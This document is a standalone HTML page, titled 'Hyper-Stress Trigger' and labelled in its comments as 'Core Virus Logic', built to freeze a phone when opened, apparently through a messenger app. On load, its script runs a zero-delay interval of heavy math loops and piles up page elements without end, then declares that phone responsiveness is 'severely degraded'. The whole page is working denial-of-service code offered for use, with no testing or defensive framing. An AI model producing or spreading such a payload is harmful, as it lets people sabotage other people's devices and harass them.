<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hyper-Stress Trigger</title>
    <style>
        /* Minimal styling to ensure the page itself isn't a bottleneck */
        body {
            background-color: #000000;
            color: #00FF00;
            font-family: 'Courier New', monospace;
            text-align: center;
            margin: 0;
            padding: 0;
            overflow: hidden; /* Hides potential scrollbars caused by stress */
        }
        #status {
            padding: 15px;
            font-size: 1.2em;
            animation: pulse 1s infinite alternate;
        }

        @keyframes pulse {
            from { opacity: 0.8; }
            to { opacity: 1.0; }
        }
    </style>
</head>
<body>
    <div id="status">INITIALIZING OVERLOAD SEQUENCE...</div>

    <script>
        // --- Core Virus Logic ---
        function initiateGlitch() {
            const statusElement = document.getElementById('status');
            let iteration = 0;

            // Target: 15 million iterations for maximum immediate strain
            const maxIterations = 15000000; 

            // Set the interval to 0ms to run the function loop as fast as JavaScript allows
            const intervalId = setInterval(() => {

                // --- 1. Extreme CPU Stress Loop (The Core) ---
                // We use a nested loop structure that is computationally expensive
                let sumX = 0;
                let sumY = 0;
                for (let j = 0; j < 500; j++) { // Inner loop complexity
                    // Tax the CPU with trigonometric and exponentiation functions
                    sumX += Math.pow(Math.sin(iteration * 0.1 + j), 2) * Math.cos(iteration * 0.05 + j);
                    sumY += Math.tan(iteration * 0.2 + j) / (j + 1);
                }

                // --- 2. Aggressive DOM Fluctuation (Secondary Strain) ---
                // Forcing frequent console logs and quick virtual element manipulation helps tax the rendering engine
                const dynamicElement = document.createElement('div');
                dynamicElement.textContent = `Iter ${iteration}: SumX=${sumX.toFixed(4)} | SumY=${sumY.toFixed(4)}`;
                document.body.appendChild(dynamicElement);

                // If the element is too slow to remove, we just let them stack up,
                // which also stresses the rendering pipeline.

                // --- 3. Monitoring and Status Update ---
                if (iteration % 10000 === 0) {
                     statusElement.textContent = `ACTIVE: Running iteration ${iteration} of ${maxIterations}. CPU load spiking.`;
                }

                iteration++;

                // Check termination condition
                if (iteration >= maxIterations) {
                    clearInterval(intervalId);

                    // Final impact alert
                    statusElement.textContent = "CRITICAL FAILURE: GLITCH SEQUENCE COMPLETE. Phone responsiveness severely degraded.";
                    document.body.style.backgroundColor = '#8B0000'; // Change color to signal failure
                }
            }, 0); 
        }

        // Execute the function when the page is fully loaded by the messenger app
        window.onload = initiateGlitch;
    </script>
</body>
</html>
